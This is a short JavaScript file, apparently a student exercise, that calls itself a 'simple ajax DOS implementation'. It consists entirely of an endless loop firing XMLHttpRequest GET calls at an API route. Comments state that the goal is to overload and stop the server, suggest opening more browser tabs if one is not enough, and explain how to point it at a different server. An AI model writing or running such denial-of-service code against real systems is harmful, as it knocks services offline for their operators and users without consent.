/* 
	Description: 
		Simple ajax DOS implementation
	
	Note:
		If a single tab process can not overload and stop the server
		add additional tab processes

	Name: Nabil Seid
	Id:   ATR/5725/08
*/

while(true){

	var xhr = new XMLHttpRequest();
	// to apply this on different server
	// change the target route or url
	xhr.open('GET', 'api/subject/all', true);
	xhr.setRequestHeader("Content-Type", "text/json");
	xhr.onreadystatechange = function() {
		// Since the purpose is to overload server
		// response data is irrelevant  
	};

	xhr.send()
}